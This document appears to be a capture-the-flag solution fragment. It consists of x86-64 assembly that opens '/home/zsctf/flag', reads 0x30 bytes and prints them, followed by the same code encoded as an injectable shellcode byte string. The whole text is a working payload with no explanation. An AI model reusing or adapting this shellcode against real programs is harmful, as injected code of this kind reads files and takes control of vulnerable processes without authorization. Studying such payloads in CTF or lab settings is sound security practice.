global _start
_start:
xor  rsi,rsi
push rsi
mov  rax,"ctf/flag"
push rax
mov  rax,"/home/zs"
push rax
mov  rdi,rsp             
xor  rdx,rdx
xor  rax,rax             
mov  al,0x2            
syscall

mov rdi,rax              
mov rsi,rsp                    
mov dl,0x30             
xor rax,rax           
syscall

mov al,0x1              
mov rdi,rax              
mov dl,0x30             
syscall


shellcode="\x48\x31\xF6\x56\x48\xB8\x63\x74\x66\x2F\x66\x6C\x61\x67\x50\x48"
shellcode+="\xB8\x2F\x68\x6F\x6D\x65\x2F\x7A\x73\x50\x48\x89\xE7\x48\x31\xD2"
shellcode+="\x48\x31\xC0\xB0\x02\x0F\x05\x48\x89\xC7\x48\x89\xE6\xB2\x30\x48"
shellcode+="\x31\xC0\x0F\x05\xB0\x01\x48\x89\xC7\xB2\x30\x0F\x05"